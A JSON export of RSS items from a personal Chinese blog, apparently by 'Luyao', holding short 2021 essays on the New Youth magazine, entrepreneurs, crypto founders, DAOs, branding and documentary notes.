          "description": "<p>新文化运动的著名刊物《新青年》杂志，在当时的销量其实<strong>少得可怜</strong>，1916 年在成都的销量只有 6 本，鼎盛时期全国销量也就 1 万 5 千本，远少于当时的商业刊物。</p>\n<p>但是它却<strong>深深地影响了当时的年轻人</strong>。</p>\n<p>毛泽东说他年轻时曾寄希望于梁启超、康有为这些人，直到读到新青年，才放弃这种幻想，转而开始关注陈独秀、胡适这些人。</p>\n<p>周恩来也说他上学时，“晨起读新青年，晚归复读之”，这本杂志打破了他的很多谬见。</p>\n<p>这让我想到一些区块链媒体。我的朋友李阳做的 <a href=\"https://www.chainnews.com/u/345196369828.htm\"   target=\"_blank\" >橙皮书</a>，连更三年后，现在一篇文章能有 2k 的阅读都已经很好了。<a href=\"https://banklesshq.com\"   target=\"_blank\" >Bankless</a> 这种大咖云集的顶级干货媒体，订阅者也才不过 3300 人。</p>\n<p>炒币媒体随便发个币价预测，就可以有几万阅读，何苦做一些大众不看的东西？现在我意识到，好媒体不需要那么多读者。</p>\n<p>他们的读者里，注定会有不少在未来翻云覆雨的大人物，一个媒体能影响到一两个这样的人物足矣，更何况可能远不止一两个。</p>\n",
          "content": "<p>新文化运动的著名刊物《新青年》杂志，在当时的销量其实<strong>少得可怜</strong>，1916 年在成都的销量只有 6 本，鼎盛时期全国销量也就 1 万 5 千本，远少于当时的商业刊物。</p>\n<p>但是它却<strong>深深地影响了当时的年轻人</strong>。</p>\n<p>毛泽东说他年轻时曾寄希望于梁启超、康有为这些人，直到读到新青年，才放弃这种幻想，转而开始关注陈独秀、胡适这些人。</p>\n<p>周恩来也说他上学时，“晨起读新青年，晚归复读之”，这本杂志打破了他的很多谬见。</p>\n<p>这让我想到一些区块链媒体。我的朋友李阳做的 <a href=\"https://www.chainnews.com/u/345196369828.htm\"   target=\"_blank\" >橙皮书</a>，连更三年后，现在一篇文章能有 2k 的阅读都已经很好了。<a href=\"https://banklesshq.com\"   target=\"_blank\" >Bankless</a> 这种大咖云集的顶级干货媒体，订阅者也才不过 3300 人。</p>\n<p>炒币媒体随便发个币价预测，就可以有几万阅读，何苦做一些大众不看的东西？现在我意识到，好媒体不需要那么多读者。</p>\n<p>他们的读者里，注定会有不少在未来翻云覆雨的大人物，一个媒体能影响到一两个这样的人物足矣，更何况可能远不止一两个。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/media/",
          "creator": "Luyao",
          "pubDate": "Thu, 01 Jul 2021 11:48:31 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "331a288232a5dd9544ec078ac40f5532",
          "highlights": []
        },
        {
          "title": "葛文耀和段永平",
          "description": "<p>今天看了冲浪普拉斯的上海家化与中国平安大战的那一期（<a href=\"https://www.bilibili.com/video/BV1Kb4y1o76g\"   target=\"_blank\" >上集</a>、<a href=\"https://www.bilibili.com/video/BV1SK4y137Ln\"   target=\"_blank\" >下集</a>），我脑海中第一个跳出来的居然是段永平。</p>\n<p>葛文耀能把上海家化做到那么大规模，能力肯定是一流的。但上海家化三次被政府干预，三次差点死掉。后来国企改革后引入大股东中国平安，结果纠纷不断，还把自己搞走了，公司也陷入衰退。</p>\n<p>单看这件事还看不出什么，但我却想到了段永平。</p>\n<p>同样是能力出色的人，段永平在90年代把小霸王做到如日中天后，因为股份制改革不顺利，他果断离开了这家国企，创办自己的公司步步高。步步高做大规模后也并没有上市，也没有遇到资本纠纷。自己做得差不多了，就退休跟巴菲特学习做股神去了，公司交给继任者也做得越来越好。</p>\n<p><strong>相似的能力，相似的开局，截然不同的路径和结局</strong>。我想能力以外，也许还有另一种聪明。</p>\n<p>在评价离开小霸王这件事时，段永平曾经说：“<strong>错误的事情要停止，代价再大也是最小的代价</strong>”，另外他还常引用芒格的话：“如果你知道你会死在哪里，别去那里就好了”。</p>\n",
          "content": "<p>今天看了冲浪普拉斯的上海家化与中国平安大战的那一期（<a href=\"https://www.bilibili.com/video/BV1Kb4y1o76g\"   target=\"_blank\" >上集</a>、<a href=\"https://www.bilibili.com/video/BV1SK4y137Ln\"   target=\"_blank\" >下集</a>），我脑海中第一个跳出来的居然是段永平。</p>\n<p>葛文耀能把上海家化做到那么大规模，能力肯定是一流的。但上海家化三次被政府干预，三次差点死掉。后来国企改革后引入大股东中国平安，结果纠纷不断，还把自己搞走了，公司也陷入衰退。</p>\n<p>单看这件事还看不出什么，但我却想到了段永平。</p>\n<p>同样是能力出色的人，段永平在90年代把小霸王做到如日中天后，因为股份制改革不顺利，他果断离开了这家国企，创办自己的公司步步高。步步高做大规模后也并没有上市，也没有遇到资本纠纷。自己做得差不多了，就退休跟巴菲特学习做股神去了，公司交给继任者也做得越来越好。</p>\n<p><strong>相似的能力，相似的开局，截然不同的路径和结局</strong>。我想能力以外，也许还有另一种聪明。</p>\n<p>在评价离开小霸王这件事时，段永平曾经说：“<strong>错误的事情要停止，代价再大也是最小的代价</strong>”，另外他还常引用芒格的话：“如果你知道你会死在哪里，别去那里就好了”。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/gwy_and_dyp/",
          "creator": "Luyao",
          "pubDate": "Thu, 01 Jul 2021 11:21:38 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "c86d2c824a8e1fe0496352765b729dc6",
          "highlights": []
        },
        {
          "title": "Crypto 的牛人们",
          "description": "<p><strong>1.</strong> 前一阵我在看 Compound 创始人的一个分享，我女朋友凑过来看了一会，说：</p>\n<p>“这人也太淳朴了，不像你们币圈的人啊”</p>\n<p>我说：“你说对了，<strong>我们币圈里最牛逼的项目，都不是投机的人做出来的</strong>。”</p>\n<p>Bitcoin、Ethereum、Uniswap、Compound… 这些项目，都不是想要捞一笔的人做出来的，他们的作者要么是理想主义者，要么就是踏实做事的人。</p>\n<p><strong>2.</strong> Uniswap 的创始人 Hayden，曾经自己买过点 ETH，后来以太坊基金会也投了一些 ETH。但所有的 ETH 在做 Uniswap 的那两年里都被花光了，除了代码审计，都是用来付房租和买吃的。这个让我比较意外，谁能想到<strong>最大的 DeFi 项目创始人，项目上线前手里一点 ETH 都没有</strong>。</p>\n<p>我们都知道 ETH 最终会涨，你是愿意把它留在手里然后变富，还是换成生活费、投入到前途未卜的项目中去？</p>\n<p>这是一个赌博。Hayden 自己也说：“我感觉幸好我赌对了。”</p>\n<p><strong>3.</strong> 橙皮书曾经发过一篇 Dodo 创始人雷达熊的文章。让我印象深刻的是，他从业多年终于悟出来一个道理：在 DeFi 领域，“permissionless” 是最重要的，比 “好用” 更重要。背后的逻辑大家可以去看那篇文章。</p>\n<p>有趣的是，没过几天，我看了 Uniswap 创始人的访谈，他回顾 17 年构思 Uniswap 最初的想法时说：</p>\n<p>“以太坊吸引我的点是它的底层属性：<strong>不需要信任、不会被下线、不需要许可</strong>。可是你看当时比较大的 DEX（去中心化交易所），比如 EtherDelta、IDEX，他们其实并不符合这些属性。”</p>\n<p>“于是我开始想：<strong>怎样在以太坊上做一个具备以太坊同样属性的项目呢？</strong>（what is it like to build on top of Ethereum that has the same properties Ethereum itself that everyone cares about.）”</p>\n<p>我听到这里一惊，这不就是 Dodo 创始人花了好几年才弄明白的道理吗？</p>\n<p>一个 17 年入行的新人，在进入行业的第一天，就悟出了别人在这个行业好几年也没有悟出的道理，最后能做成，我不意外。</p>\n",
          "content": "<p><strong>1.</strong> 前一阵我在看 Compound 创始人的一个分享，我女朋友凑过来看了一会，说：</p>\n<p>“这人也太淳朴了，不像你们币圈的人啊”</p>\n<p>我说：“你说对了，<strong>我们币圈里最牛逼的项目，都不是投机的人做出来的</strong>。”</p>\n<p>Bitcoin、Ethereum、Uniswap、Compound… 这些项目，都不是想要捞一笔的人做出来的，他们的作者要么是理想主义者，要么就是踏实做事的人。</p>\n<p><strong>2.</strong> Uniswap 的创始人 Hayden，曾经自己买过点 ETH，后来以太坊基金会也投了一些 ETH。但所有的 ETH 在做 Uniswap 的那两年里都被花光了，除了代码审计，都是用来付房租和买吃的。这个让我比较意外，谁能想到<strong>最大的 DeFi 项目创始人，项目上线前手里一点 ETH 都没有</strong>。</p>\n<p>我们都知道 ETH 最终会涨，你是愿意把它留在手里然后变富，还是换成生活费、投入到前途未卜的项目中去？</p>\n<p>这是一个赌博。Hayden 自己也说：“我感觉幸好我赌对了。”</p>\n<p><strong>3.</strong> 橙皮书曾经发过一篇 Dodo 创始人雷达熊的文章。让我印象深刻的是，他从业多年终于悟出来一个道理：在 DeFi 领域，“permissionless” 是最重要的，比 “好用” 更重要。背后的逻辑大家可以去看那篇文章。</p>\n<p>有趣的是，没过几天，我看了 Uniswap 创始人的访谈，他回顾 17 年构思 Uniswap 最初的想法时说：</p>\n<p>“以太坊吸引我的点是它的底层属性：<strong>不需要信任、不会被下线、不需要许可</strong>。可是你看当时比较大的 DEX（去中心化交易所），比如 EtherDelta、IDEX，他们其实并不符合这些属性。”</p>\n<p>“于是我开始想：<strong>怎样在以太坊上做一个具备以太坊同样属性的项目呢？</strong>（what is it like to build on top of Ethereum that has the same properties Ethereum itself that everyone cares about.）”</p>\n<p>我听到这里一惊，这不就是 Dodo 创始人花了好几年才弄明白的道理吗？</p>\n<p>一个 17 年入行的新人，在进入行业的第一天，就悟出了别人在这个行业好几年也没有悟出的道理，最后能做成，我不意外。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/crypto_guys/",
          "creator": "Luyao",
          "pubDate": "Mon, 14 Jun 2021 13:59:26 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "4ecc5a1610406f62325b5de8edab0e2d",
          "highlights": []
        },
        {
          "title": "英语",
          "description": "<p>最近泡在 Bankless DAO 的群组里，忽然意识到英语很重要。</p>\n<p>如果英语不好，连 Meeting 都参与不了，更别说组织一个 DAO 了。</p>\n<p>英语在 crypto 世界将会是一个普遍的问题。原因是<strong>Token 的发行一定是全球化的，DAO 多半也是全球化的，大家的语言肯定是英语，不会是中文</strong>。中国人日本人在这块就很吃亏。</p>\n<p>对组织者而言，英语基础必须要好。</p>\n",
          "content": "<p>最近泡在 Bankless DAO 的群组里，忽然意识到英语很重要。</p>\n<p>如果英语不好，连 Meeting 都参与不了，更别说组织一个 DAO 了。</p>\n<p>英语在 crypto 世界将会是一个普遍的问题。原因是<strong>Token 的发行一定是全球化的，DAO 多半也是全球化的，大家的语言肯定是英语，不会是中文</strong>。中国人日本人在这块就很吃亏。</p>\n<p>对组织者而言，英语基础必须要好。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/dao_english/",
          "creator": "Luyao",
          "pubDate": "Sun, 30 May 2021 15:25:58 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "3910a0f67e174c7a4077dc7c16184e9c",
          "highlights": []
        },
        {
          "title": "加密时代的人力资源",
          "description": "<p>Crypto 可能会让人力资源的流动更有效率。</p>\n<p>一个原因是所有 crypto 项目都是全透明的，代码透明、战略透明、沟通透明，没有秘密可言。这使得<strong>它们天然适合无门槛的协作</strong>。</p>\n<p>这在传统企业组织是不可能的，没有任何一家传统公司会愿意让自己的代码、内部数据、内部文档、内部沟通曝光给所有人。</p>\n<p>所以它们会仔细甄选应聘者，确认对方是自己想要的人后，才会 “让他进来，成为我们的一份子”。人员的高流动性，是这些企业最不想看到的。</p>\n<p><strong>人的高流动性在传统企业是问题，但在 crypto 的组织内却是优势。</strong></p>\n<p>对于一个人，从他听说你的公司/项目，到他真正开始为项目工作、做出贡献，如果超过 1 小时，就说明门槛太高了。</p>\n",
          "content": "<p>Crypto 可能会让人力资源的流动更有效率。</p>\n<p>一个原因是所有 crypto 项目都是全透明的，代码透明、战略透明、沟通透明，没有秘密可言。这使得<strong>它们天然适合无门槛的协作</strong>。</p>\n<p>这在传统企业组织是不可能的，没有任何一家传统公司会愿意让自己的代码、内部数据、内部文档、内部沟通曝光给所有人。</p>\n<p>所以它们会仔细甄选应聘者，确认对方是自己想要的人后，才会 “让他进来，成为我们的一份子”。人员的高流动性，是这些企业最不想看到的。</p>\n<p><strong>人的高流动性在传统企业是问题，但在 crypto 的组织内却是优势。</strong></p>\n<p>对于一个人，从他听说你的公司/项目，到他真正开始为项目工作、做出贡献，如果超过 1 小时，就说明门槛太高了。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/human_resource/",
          "creator": "Luyao",
          "pubDate": "Fri, 21 May 2021 13:59:29 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "906b2e434113482ba92f82deb8b87378",
          "highlights": []
        },
        {
          "title": "追风口的人",
          "description": "<p>看了农夫山泉创始人钟睒睒的发家史，发现去风口淘金并不可耻。</p>\n<p>90 年代海南开放后，钟睒睒辞去了浙江日报记者的工作，也参与到海南淘金中，去海南办了太平洋邮报。</p>\n<p>我印象里那些地产大亨当时也在往海南跑，比如潘石屹、任志强、冯伦这些人都是在海南发家的。当时的海南，感觉就跟今天的区块链一样，一个赚钱的地方出现后，大家蜂拥进去淘金。</p>\n<p>我想到当下科技圈的氛围，大家没有很瞧得起去搞区块链的人。仿佛这些人就是永远逐利而不得的 loser，18 年有个段子甚至说：“如今搞区块链的和当年搞 O2O 的是同一帮人”。</p>\n<p>海南这个事情说明，涌向风口里淘金的未必就是 loser，也会有许多未来的大人物。</p>\n<p>后来钟睒睒办报失败，就开始做蘑菇生意，但也失败了，然后又捣鼓了对虾、窗帘生意，全部都失败了，最后，看到娃娃哈的宗庆后做保健品一炮而红之后，他也开始弄保健品，成立了养生堂公司。</p>\n<p>这个事情给我的感受，跟前面海南的事情类似，我们社会不喜欢看到人捣鼓各种 “风口”，反复 “追风口” 似乎是那些失败者的专属特征。但事实看来并非如此，这些人里也有了不起的人。</p>\n",
          "content": "<p>看了农夫山泉创始人钟睒睒的发家史，发现去风口淘金并不可耻。</p>\n<p>90 年代海南开放后，钟睒睒辞去了浙江日报记者的工作，也参与到海南淘金中，去海南办了太平洋邮报。</p>\n<p>我印象里那些地产大亨当时也在往海南跑，比如潘石屹、任志强、冯伦这些人都是在海南发家的。当时的海南，感觉就跟今天的区块链一样，一个赚钱的地方出现后，大家蜂拥进去淘金。</p>\n<p>我想到当下科技圈的氛围，大家没有很瞧得起去搞区块链的人。仿佛这些人就是永远逐利而不得的 loser，18 年有个段子甚至说：“如今搞区块链的和当年搞 O2O 的是同一帮人”。</p>\n<p>海南这个事情说明，涌向风口里淘金的未必就是 loser，也会有许多未来的大人物。</p>\n<p>后来钟睒睒办报失败，就开始做蘑菇生意，但也失败了，然后又捣鼓了对虾、窗帘生意，全部都失败了，最后，看到娃娃哈的宗庆后做保健品一炮而红之后，他也开始弄保健品，成立了养生堂公司。</p>\n<p>这个事情给我的感受，跟前面海南的事情类似，我们社会不喜欢看到人捣鼓各种 “风口”，反复 “追风口” 似乎是那些失败者的专属特征。但事实看来并非如此，这些人里也有了不起的人。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/zhongshanshan/",
          "creator": "Luyao",
          "pubDate": "Sun, 16 May 2021 21:55:00 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "5761e8f92bb46f2a84916a35badf6aa0",
          "highlights": []
        },
        {
          "title": "HBO出品纪录片《Tiger Woods》",
          "description": "<ul>\n<li><strong>他居然从8个月大，一直打球打到现在</strong>。这很难得，普通人大概中学就去干别的了。</li>\n<li>他妈说小时候喂他吃饭，只有在他打两杆球的间隙，才能喂到他一口饭。能感觉到他非常专注。</li>\n<li>视频里的他似乎很少开口说话，尤其是小时候。</li>\n<li>顶级运动员不会让前面的失误影响自己的情绪。</li>\n</ul>\n",
          "content": "<ul>\n<li><strong>他居然从8个月大，一直打球打到现在</strong>。这很难得，普通人大概中学就去干别的了。</li>\n<li>他妈说小时候喂他吃饭，只有在他打两杆球的间隙，才能喂到他一口饭。能感觉到他非常专注。</li>\n<li>视频里的他似乎很少开口说话，尤其是小时候。</li>\n<li>顶级运动员不会让前面的失误影响自己的情绪。</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/tiger1/",
          "creator": "Luyao",
          "pubDate": "Fri, 14 May 2021 17:37:55 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "fcf63c29939a25711595207de04a77cf",
          "highlights": []
        },
        {
          "title": "段永平",
          "description": "<ul>\n<li>不要让重要的事情变成紧急的事情</li>\n<li>可以讲价对卖家来是是一个非常短视且有害的行为，提高了销售成本且不易管理，而且可以讨价还价会让顾客有吃亏了的感觉。</li>\n<li>在靠谱的地方待过才知道什么是不靠谱，反过来其实不成立。</li>\n<li>真正好的投资者是目中无人的，他不会去问别人觉得一家公司怎么样。</li>\n<li>关注生意而非股价</li>\n<li>没有耐心是理性不够的表现</li>\n<li>段和一个棋手下棋，有个地方哪里都不对劲，复盘时棋手说：<strong>那个地方你怎么下都没用的，因为你之前的一个地方下错了</strong>。</li>\n</ul>\n",
          "content": "<ul>\n<li>不要让重要的事情变成紧急的事情</li>\n<li>可以讲价对卖家来是是一个非常短视且有害的行为，提高了销售成本且不易管理，而且可以讨价还价会让顾客有吃亏了的感觉。</li>\n<li>在靠谱的地方待过才知道什么是不靠谱，反过来其实不成立。</li>\n<li>真正好的投资者是目中无人的，他不会去问别人觉得一家公司怎么样。</li>\n<li>关注生意而非股价</li>\n<li>没有耐心是理性不够的表现</li>\n<li>段和一个棋手下棋，有个地方哪里都不对劲，复盘时棋手说：<strong>那个地方你怎么下都没用的，因为你之前的一个地方下错了</strong>。</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/duanyongping/",
          "creator": "Luyao",
          "pubDate": "Fri, 14 May 2021 16:20:03 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "4cf0980ca6827df76132a353c490b614",
          "highlights": []
        },
        {
          "title": "Netflix 纪录片《Money, Explained》",
          "description": "<p><a href=\"https://www.bilibili.com/video/BV1yf4y1a78o/\"   target=\"_blank\" >视频</a></p>\n<ul>\n<li>被金钱骗局骗的人没有任何共同点，也就是说任何人都会被骗。我猜想可能是因为所有人都很贪婪。从另一方面来说，庞氏真的很厉害，它可以让所有人上钩。</li>\n<li><strong>赌博中的停顿很重要</strong>，就是从下注到出现结果的那一刻，那是多巴胺释放的时间。</li>\n<li>麻省理工的21点团队和扑克大神都说：“<strong>我们不会让输赢的情绪影响我们的比赛</strong>”</li>\n<li><strong>人类通过进化，已经非常擅长识别各种 pattern，但许多 pattern 是假的</strong>。“你要学会抓住真正的 pattern，忽略假的 pattern”</li>\n</ul>\n",
          "content": "<p><a href=\"https://www.bilibili.com/video/BV1yf4y1a78o/\"   target=\"_blank\" >视频</a></p>\n<ul>\n<li>被金钱骗局骗的人没有任何共同点，也就是说任何人都会被骗。我猜想可能是因为所有人都很贪婪。从另一方面来说，庞氏真的很厉害，它可以让所有人上钩。</li>\n<li><strong>赌博中的停顿很重要</strong>，就是从下注到出现结果的那一刻，那是多巴胺释放的时间。</li>\n<li>麻省理工的21点团队和扑克大神都说：“<strong>我们不会让输赢的情绪影响我们的比赛</strong>”</li>\n<li><strong>人类通过进化，已经非常擅长识别各种 pattern，但许多 pattern 是假的</strong>。“你要学会抓住真正的 pattern，忽略假的 pattern”</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/netflix_money/",
          "creator": "Luyao",
          "pubDate": "Thu, 13 May 2021 17:46:01 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9e9fe4624ac2c0371703ffaff7626e61",
          "highlights": []
        },
        {
          "title": "Netflix 比尔盖茨纪录片《Inside Bill's Brain》",
          "description": "<p><a href=\"https://www.bilibili.com/video/BV1Uy4y117bu\"   target=\"_blank\" >视频</a></p>\n<ul>\n<li>有个事情印象深刻，他常说 “<strong>Work harder</strong>”。对于 “怎么办，要不要放弃”，<strong>他每次的自言自语总是 &ldquo;I should work harder&rdquo;</strong>。</li>\n<li>他总是带着很多书，他每天晚上都会读 1 小时以上。看到他每天带一麻袋书我真是惊了。</li>\n<li>据说他一小时能读 150 页书。</li>\n<li>Bill 对时间的规划非常细致，他认为自己最宝贵的资源就是时间。</li>\n<li>Bill 做事情非常专注，非常投入，“周末、休假，这对我来说都是不需要的”。</li>\n</ul>\n",
          "content": "<p><a href=\"https://www.bilibili.com/video/BV1Uy4y117bu\"   target=\"_blank\" >视频</a></p>\n<ul>\n<li>有个事情印象深刻，他常说 “<strong>Work harder</strong>”。对于 “怎么办，要不要放弃”，<strong>他每次的自言自语总是 &ldquo;I should work harder&rdquo;</strong>。</li>\n<li>他总是带着很多书，他每天晚上都会读 1 小时以上。看到他每天带一麻袋书我真是惊了。</li>\n<li>据说他一小时能读 150 页书。</li>\n<li>Bill 对时间的规划非常细致，他认为自己最宝贵的资源就是时间。</li>\n<li>Bill 做事情非常专注，非常投入，“周末、休假，这对我来说都是不需要的”。</li>\n</ul>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/bill/",
          "creator": "Luyao",
          "pubDate": "Wed, 12 May 2021 23:07:24 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "8349c9d563a040b394208c2eebf46f79",
          "highlights": []
        },
        {
          "title": "加密原生应用",
          "description": "<p>读了一篇 <a href=\"https://versionone.vc/crypto-native-applications/\"   target=\"_blank\" >《Crypto Native Application》</a>，很有启发。</p>\n<p>对于手机来说，它特有的能力是随身携带以及 GPS 等传感器，概括起来这个能力实际上就是 “<strong>always on, and everywhere</strong>”，所以 Mobile Native 的产品实际上就是充分利用了这一特性的产品，比如微信、地图导航、照片分享。</p>\n<p>对于 Blockchain，它特有的能力是<strong>做承诺（make commitments）</strong>，概括起来实际上就是以太坊那套核心理念：<strong>Trustless，Unstoppable，Permissionless</strong>。所以 Crypto Native 的产品，应该是充分利用这些特性的产品，比如 Uniswap，你无需信任，也无法关闭它，也不需要准入门槛。</p>\n",
          "content": "<p>读了一篇 <a href=\"https://versionone.vc/crypto-native-applications/\"   target=\"_blank\" >《Crypto Native Application》</a>，很有启发。</p>\n<p>对于手机来说，它特有的能力是随身携带以及 GPS 等传感器，概括起来这个能力实际上就是 “<strong>always on, and everywhere</strong>”，所以 Mobile Native 的产品实际上就是充分利用了这一特性的产品，比如微信、地图导航、照片分享。</p>\n<p>对于 Blockchain，它特有的能力是<strong>做承诺（make commitments）</strong>，概括起来实际上就是以太坊那套核心理念：<strong>Trustless，Unstoppable，Permissionless</strong>。所以 Crypto Native 的产品，应该是充分利用这些特性的产品，比如 Uniswap，你无需信任，也无法关闭它，也不需要准入门槛。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/crypto_native/",
          "creator": "Luyao",
          "pubDate": "Wed, 05 May 2021 17:50:06 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "b28f10f7e8f294e316e738ffddcd928d",
          "highlights": []
        },
        {
          "title": "从 don't be evil 到 can't be evil",
          "description": "<p>和万熊聊起 Uniswap 的代码只有四百行这件事，我说转账 1 亿美元，Ethereum 上只需要一行代码，而传统项目里需要做很多很多事情。</p>\n<p>万熊说：“这 TMD 不就是芒格希望有的无缝的信任之网吗”。</p>\n<blockquote>\n<p>芒格：文明所能达到的最高形式应该是无缝的信任之网。没有繁复的程序，只有一群可靠的人，他们彼此之间有正确的信任。</p>\n</blockquote>\n<p>但我觉得真正有趣的是，<strong>这张信任之网，却是在 “假设所有人都不可信任” 的前提下编织的</strong>。区块链被构建出来，它就假设所有人都是不可信的，让人们从 &ldquo;don&rsquo;t be evil&rdquo; 变成 &ldquo;can&rsquo;t be evil&rdquo;。</p>\n<p>话说回来，我觉得在一个 &ldquo;can&rsquo;t be evil&rdquo; 的环境，<strong>人会生活的比较轻松</strong>。</p>\n<p>就比如说，如果屋子没有门禁卡，就得配一个保安，每当有人要进，就盘问一番，去哪？做什么？但有了门禁卡后，刷卡才能进，can&rsquo;t be evil，就不用保安挨个盘问了，人会舒服很多。</p>\n",
          "content": "<p>和万熊聊起 Uniswap 的代码只有四百行这件事，我说转账 1 亿美元，Ethereum 上只需要一行代码，而传统项目里需要做很多很多事情。</p>\n<p>万熊说：“这 TMD 不就是芒格希望有的无缝的信任之网吗”。</p>\n<blockquote>\n<p>芒格：文明所能达到的最高形式应该是无缝的信任之网。没有繁复的程序，只有一群可靠的人，他们彼此之间有正确的信任。</p>\n</blockquote>\n<p>但我觉得真正有趣的是，<strong>这张信任之网，却是在 “假设所有人都不可信任” 的前提下编织的</strong>。区块链被构建出来，它就假设所有人都是不可信的，让人们从 &ldquo;don&rsquo;t be evil&rdquo; 变成 &ldquo;can&rsquo;t be evil&rdquo;。</p>\n<p>话说回来，我觉得在一个 &ldquo;can&rsquo;t be evil&rdquo; 的环境，<strong>人会生活的比较轻松</strong>。</p>\n<p>就比如说，如果屋子没有门禁卡，就得配一个保安，每当有人要进，就盘问一番，去哪？做什么？但有了门禁卡后，刷卡才能进，can&rsquo;t be evil，就不用保安挨个盘问了，人会舒服很多。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/cant_be_evil/",
          "creator": "Luyao",
          "pubDate": "Mon, 03 May 2021 13:37:01 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "6b73d5a6ebb0732453717c4b47013599",
          "highlights": []
        },
        {
          "title": "加密项目的branding",
          "description": "<p>你拿出一个去中心化的项目，和一个赚钱的项目，问别人喜欢哪个。<strong>全世界人都知道 Vitalik 和以太坊基金会会喜欢那个去中心化的，而不是赚钱的</strong>。这就是他们的 value，而且传递得很好。</p>\n<p>Google 提供的价值是让人们更快、更多地找到想要的信息。而我们也知道，它大概率不会为了赚钱而损害这个价值，这是它的 branding。</p>\n<p>火币虽然很赚钱，但你拿出火币问大家，“火币想要什么”，大家都知道火币想赚钱，而这跟用户是没有关系的。</p>\n<p>回到 crypto 上，目前大部分 crypto 项目都是具有一定公共、基础设施属性的，他们<strong>应该传达的不是 “我最牛逼”，而应该是 “我真的很想让你们大家变牛逼”。</strong></p>\n<p>如果你给人的感觉是 “想赚钱”，那你就没有 branding。</p>\n",
          "content": "<p>你拿出一个去中心化的项目，和一个赚钱的项目，问别人喜欢哪个。<strong>全世界人都知道 Vitalik 和以太坊基金会会喜欢那个去中心化的，而不是赚钱的</strong>。这就是他们的 value，而且传递得很好。</p>\n<p>Google 提供的价值是让人们更快、更多地找到想要的信息。而我们也知道，它大概率不会为了赚钱而损害这个价值，这是它的 branding。</p>\n<p>火币虽然很赚钱，但你拿出火币问大家，“火币想要什么”，大家都知道火币想赚钱，而这跟用户是没有关系的。</p>\n<p>回到 crypto 上，目前大部分 crypto 项目都是具有一定公共、基础设施属性的，他们<strong>应该传达的不是 “我最牛逼”，而应该是 “我真的很想让你们大家变牛逼”。</strong></p>\n<p>如果你给人的感觉是 “想赚钱”，那你就没有 branding。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/branding3/",
          "creator": "Luyao",
          "pubDate": "Fri, 16 Apr 2021 15:00:05 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "7a622d57aeb21e124434e409192e2fa9",
          "highlights": []
        },
        {
          "title": "Github创始人谈branding",
          "description": "<p>Github 创始人说，（作为公司）当你朝着别人说 “快来看我好酷我好棒啊” 是没有用的，你要帮助别人变得更好，你才会更好。这是别人把你的贴纸贴在电脑上的原因。</p>\n<p>别人贴你的贴纸，跟你的公司没有半毛钱关系，<strong>大家只是在 communicating values</strong>。</p>\n<p>如果你没有传递这种 value，你就没有 branding，因为大家 have nothing to communicate。</p>\n<p><strong>&ldquo;Let me help you be better.&rdquo;</strong></p>\n<p>That’s the reason people put your sticker on their laptop.</p>\n<p>It has nothing to do with the company. People are communicating their values, “I care about open source””I like coding”&hellip; People share the same value as github.</p>\n<p>I suggest you view branding this way。If you have no discernable values then nobody will care about your brand because it’s not communicating anything, no believing in it.</p>\n<p><strong>You have to believe in something.</strong></p>\n",
